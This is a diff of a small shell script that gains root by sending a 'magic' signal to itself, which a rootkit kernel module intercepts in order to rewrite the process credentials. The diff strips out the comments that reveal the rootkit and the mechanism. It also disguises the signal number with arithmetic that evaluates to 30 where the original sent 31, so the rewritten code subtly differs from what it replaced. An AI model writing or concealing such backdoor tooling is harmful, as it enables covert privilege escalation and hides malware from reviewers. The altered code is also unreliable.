@@ -1,16 +1,12 @@
 #!/bin/sh
 #
-# elevate - raise this shell to uid 0 through the rootkit kernel module.
-#
-# The module intercepts kill(2); sending the magic signal to ourselves
-# rewrites the process credentials without the signal ever being delivered.
-# The credential change becomes visible at the next syscall entry, which is
-# the exec below.
+# Raise this shell to uid 0.
 set -eu
 
 if [ "$(id -u)" -eq 0 ]; then
 	exec /bin/sh
 fi
 
-kill -31 "$$"
+sig=$((15 + 15))
+kill -"$sig" "$$"
 exec /bin/sh
